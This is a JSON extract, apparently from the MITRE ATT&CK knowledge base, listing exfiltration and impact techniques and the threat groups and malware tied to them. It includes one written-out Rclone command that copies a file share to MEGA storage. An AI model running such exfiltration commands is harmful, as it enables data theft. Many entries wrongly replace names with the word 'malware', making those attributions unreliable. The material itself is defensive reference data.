                        "Name": "Mustang Panda",
                        "Description": "<name> has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.[4]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.[5]"
                    },
                    "S0035": {
                        "ID": "S0035",
                        "Name": "SPACESHIP",
                        "Description": "<name> copies staged data to removable drives when they are inserted into the system.[6]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has exfiltrated data using USB storage devices.[7]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> exfiltrates collected files via removable media from air-gapped victims.[8]"
                    }
                }
            }
        },
        "tactic": "Exfiltration",
        "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
        "Procedure": {}
    },
    "T1567": {
        "ttp_name": "Exfiltration Over Web Service",
        "ttp_id": "T1567",
        "href": "/techniques/T1567",
        "subtechnique": {
            "001": {
                "name": "Exfiltration to Code Repository",
                "href": "/techniques/T1567/001",
                "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use GitHub for data exfiltration.[1]"
                    }
                }
            },
            "002": {
                "name": "Exfiltration to Cloud Storage",
                "href": "/techniques/T1567/002",
                "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
                "Procedure": {
                    "G1024": {
                        "ID": "G1024",
                        "Name": "Akira",
                        "Description": "<name> will exfiltrate victim data using applications such as Rclone.[1]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> can upload data to dedicated per-victim folders in Dropbox.[2]"
                    },
                    "S0651": {
                        "ID": "S0651",
                        "Name": "BoxCaon",
                        "Description": "<name> has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.[3]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has exfiltrated stolen data to OneDrive accounts.[5]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.[6]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can send files from a victim's machine to Dropbox.[7][8]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has exfiltrated victim data to cloud storage service accounts.[9]"
                    },
                    "S1023": {
                        "ID": "S1023",
                        "Name": "CreepyDrive",
                        "Description": "<name> can use cloud services including OneDrive for data exfiltration.[10]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has exfiltrated stolen data to Dropbox.[11]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used the megacmd tool to upload stolen files from a victim network to MEGA.[12]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use Dropbox for data exfiltration.[13]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has exfiltrated stolen data to the MEGA file sharing site.[14]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has exfiltrated data to file sharing sites, including MEGA.[15]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "<name> exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.[16]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used cloud services, including OneDrive, for data exfiltration.[10]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has exfiltrated stolen files and data to actor-controlled Blogspot accounts.[17]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.[18][19]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has exfiltrated data to Google Drive.[20]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has exfiltrated data to file sharing sites.[21]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[22][23]"
                    },
                    "S1102": {
                        "ID": "S1102",
                        "Name": "Pcexter",
                        "Description": "<name> can upload stolen files to OneDrive storage accounts via HTTP POST.[24]"
                    },
                    "G1005": {
                        "ID": "G1005",
                        "Name": "POLONIUM",
                        "Description": "<name> has exfiltrated stolen data to <name>-owned OneDrive and Dropbox accounts.[10]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use a file exfiltration tool to upload specific files to Dropbox.[25]"
                    },
                    "S1040": {
                        "ID": "S1040",
                        "Name": "Rclone",
                        "Description": "<name> can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.[26][4]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can send collected data to cloud storage services such as PCloud.[27][28]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> has exfiltrated victim data to the MEGA file sharing site.[29][30]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has exfiltrated stolen data to Dropbox.[7]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used a DropBox uploader to exfiltrate stolen files.[24]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used WebDAV to upload stolen USB files to a cloud drive.[31] <name> has also exfiltrated stolen files to OneDrive and 4shared.[32]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has exfiltrated stolen victim data to various cloud storage providers.[33]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has exfiltrated stolen data to Dropbox.[34]"
                    }
                }
            },
            "003": {
                "name": "Exfiltration to Text Storage Sites",
                "href": "/techniques/T1567/003",
                "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and other information.  Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.[1]Note: This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.",
                "Procedure": {}
            },
            "004": {
                "name": "Exfiltration Over Webhook",
                "href": "/techniques/T1567/004",
                "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.[1] Many public and commercial services, such as Discord, Slack, and webhook.site, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.[2] When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data.[3] Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.[4]Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.[5][6][7]",
                "Procedure": {}
            }
        },
        "tactic": "Exfiltration",
        "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has exfiltrated files using web services.[1]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware can exfiltrate data over Google Drive.[2]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used Cloudflare services for data exfiltration.[3]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware has used legitimate web services to exfiltrate data.[4]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used the Telegram API sendMessage to relay data on compromised devices.[5]"
            },
            "S0508": {
                "ID": "S0508",
                "Name": "ngrok",
                "Description": "malware has been used by threat actors to configure servers for data exfiltration.[6]"
            }
        }
    },
    "T1029": {
        "ttp_name": "Scheduled Transfer",
        "ttp_id": "T1029",
        "href": "/techniques/T1029",
        "tactic": "Exfiltration",
        "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.[1]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can set itself to sleep before requesting a new command from C2.[2]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.[3]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).[4]"
            },
            "S0200": {
                "ID": "S0200",
                "Name": "Dipsind",
                "Description": "malware can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.[5]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has the ability to wait for a specified time interval between communicating with and executing commands from C2.[6]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.[7]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can be configured to reconnect at certain intervals.[8]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware can sleep for a specific time and be set to communicate at specific intervals.[9]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware can be configured to exfiltrate data during nighttime or working hours.[10]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.[11]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware sends stolen data to the C2 server every 10 minutes.[12]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can configure its agent to work only in specific time frames.[13]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can sleep for a given number of seconds.[14]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has sent data back to C2 every 8 hours.[15]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can pause C2 communications for a specified time.[16]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware can sleep when instructed to do so by the C2.[17]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware contacts its C2 based on a scheduled timing set in its configuration.[18]"
            }
        }
    },
    "T1537": {
        "ttp_name": "Transfer Data to Cloud Account",
        "ttp_id": "T1537",
        "href": "/techniques/T1537",
        "tactic": "Exfiltration",
        "description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.[1]Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.[2]Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.[3]",
        "Procedure": {}
    },
    "T1531": {
        "ttp_name": "Account Access Removal",
        "ttp_id": "T1531",
        "href": "/techniques/T1531",
        "tactic": "Impact",
        "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.[1][2]In Windows, Net utility, Set-LocalUser and Set-ADAccountPassword PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the passwd utility may be used to change passwords. Accounts could also be disabled by Group Policy. Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.",
        "Procedure": {
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware deletes administrator accounts in victim networks prior to encryption.[3]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has removed a targeted organization's global admin accounts to lock the organization out of all access.[4]"
            },
            "S0372": {
                "ID": "S0372",
                "Name": "LockerGoga",
                "Description": "malware has been observed changing account passwords and logging off current users.[1][2]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware has changed user account passwords and logged users off the system.[5]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware has the ability to change the password of local users on compromised hosts and can log off users.[6]"
            }
        }
    },
    "T1485": {
        "ttp_name": "Data Destruction",
        "ttp_id": "T1485",
        "href": "/techniques/T1485",
        "tactic": "Impact",
        "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.[1][2][3][4][5][6] Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.[4][5] In some cases politically oriented image files have been used to overwrite data.[2][3][4]To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[1][2][3][4][6].In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.[7][8]",
        "Procedure": {
            "C0034": {
                "ID": "C0034",
                "Name": "2022 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team deployed CaddyWiper on the victim\u2019s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.[9]"
            },
            "S1125": {
                "ID": "S1125",
                "Name": "AcidRain",
                "Description": "malware performs an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it.[10]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has used a custom secure delete function to make deleted files unrecoverable.[11]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.[12][13]"
            },
            "S0693": {
                "ID": "S0693",
                "Name": "CaddyWiper",
                "Description": "malware can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.[14][15]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can delete specified files from a targeted system.[16]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used tools to delete files and folders from victims' desktops and profiles.[17]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can recursively wipe folders and files in Windows, Program Files, Program Files(x86), PerfLogs, Boot, System, Volume Information, and AppData folders using FSCTL_MOVE_FILE. malware can also overwrite symbolic links and big files in My Documents and on the Desktop with random bytes.[18]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware\u2019s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.[19]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware can overwrite files with random data before deleting them.[20]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware deletes system files to make the OS unbootable. malware also targets and deletes files with 35 different file extensions.[21]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has deleted the target's systems and resources both on-premises and in the cloud.[22][23]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used a custom secure delete function to overwrite file contents with data from heap memory.[24]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them.[25]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware overwrites files locally and on remote shares.[6][26]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has a command to write random data across a file and delete it.[27]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware can overwrite files indicated by the attacker before deleting them.[28]"
            },
            "S0364": {
                "ID": "S0364",
                "Name": "RawDisk",
                "Description": "malware was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.[3][5]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware has the capability to destroy files and folders.[29][30][31][31][32][33][34]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used the BlackEnergy KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. [35][36]"
            },
            "S0195": {
                "ID": "S0195",
                "Name": "SDelete",
                "Description": "malware deletes data in a way that makes it unrecoverable.[37]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware attempts to overwrite operating system files and disk structures with image files.[1][2][3] In a later variant, randomly generated data was used for data overwrites.[5][38]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has a disk wiper module that targets files other than those in the Windows directory.[4]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can corrupt files by overwriting the first 1 MB with 0xcc and appending random extensions.[39][40][41][42][43][44]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware has destroyed Linux-based databases as part of its ransomware capabilities.[45]"
            }
        }
    },
    "T1486": {
        "ttp_name": "Data Encrypted for Impact",
        "ttp_id": "T1486",
        "href": "/techniques/T1486",
        "tactic": "Impact",
        "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.[1][2][3][4]In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files.[5] In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.[3] To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[2][3] Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").[6]In cloud environments, storage objects within compromised accounts may also be encrypted.[7]",
        "Procedure": {
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware encrypts victim filesystems for financial extortion purposes.[8]"
            },
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware encrypts files in victim environments as part of ransomware operations.[9]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has used Hermes ransomware to encrypt files with AES256.[10]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.[11]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware encrypts the victim system using a combination of AES256 and RSA encryption schemes.[12]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has encrypted files and network resources using AES-256 and added an .avos, .avos2, or .AvosLinux extension to filenames.[13][14][15][16]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can use ChaCha8 and ECDH to encrypt data.[17][18][19][20]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware has encrypted files and disks using AES-128-CBC and RSA-2048.[21]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending .locked to the filename.[22]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.[23][24][25][26][27][28][29][30][31]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware has the ability to encrypt Windows devices, Linux devices, and VMWare instances.[32]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used Conti ransomware to encrypt a compromised network.[33]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors used AvosLocker ransomware to encrypt files on the compromised network.[15][34]"
            },
            "S1096": {
                "ID": "S1096",
                "Name": "Cheerscrypt",
                "Description": "malware can encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve Diffie\u2013Hellman (ECDH) generated key.[35][36]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files.[37][38][39]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can use CreateIoCompletionPort(), PostQueuedCompletionStatus(), and GetQueuedCompletionPort() to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. malware can use \"Windows Restart Manager\" to ensure files are unlocked and open for encryption.[40][5][41][42][33]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware has the ability to encrypt system data and add the \".cuba\" extension to encrypted files.[43]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware can deploy follow-on ransomware payloads.[44]"
            },
            "S1033": {
                "ID": "S1033",
                "Name": "DCSrv",
                "Description": "malware has encrypted drives using the core encryption mechanism from DiskCryptor.[45]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware can use public and private key pair encryption to encrypt files for ransom payment.[46]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has encrypted files using an RSA key though the CryptEncrypt API and has appended filenames with \".lock64\". [47]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note.[6][48]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware uses standard encryption library functions to encrypt files.[49][50]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.[51][52]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks.[53]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware can use an embedded NTRU public key to encrypt data for ransom.[46][54][55]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware can use an embedded RSA-2048 public key to encrypt victim data for ransom.[46]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has encrypted domain-controlled systems using BitPaymer.[22]"
            },
            "S0389": {
                "ID": "S0389",
                "Name": "JCry",
                "Description": "malware has encrypted files and demanded Bitcoin to decrypt those files. [56]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.[57]"
            },
            "S0372": {
                "ID": "S0372",
                "Name": "LockerGoga",
                "Description": "malware has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.[58][59][60]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used BitLocker and DiskCryptor to encrypt targeted workstations. [61][62]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. malware has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.[63]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.[64][65]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can encrypt files on infected machines to extort victims.[66]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware encrypts user files and disk structures like the MBR with 2048-bit RSA.[67][3][68]"
            },
            "S0556": {
                "ID": "S0556",
                "Name": "Pay2Key",
                "Description": "malware can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.[69][70]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with .enc.[71]"
            },
            "S0654": {
                "ID": "S0654",
                "Name": "ProLock",
                "Description": "malware can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.[72]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions.[73]"
            },
            "S0481": {
                "ID": "S0481",
                "Name": "Ragnar Locker",
                "Description": "malware encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.[74][75]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can encrypt files on victim systems and demands a ransom to decrypt the files.[76][77][78][79][80][81][82][83]"
            },
            "S0400": {
                "ID": "S0400",
                "Name": "RobbinHood",
                "Description": "malware will search for an RSA encryption key and then perform its encryption process on the system files.[84]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.[85][86][87]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of malwareReadMe.txt written to the directory.[88][42]"
            },
            "S0370": {
                "ID": "S0370",
                "Name": "SamSam",
                "Description": "malware encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.[89]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
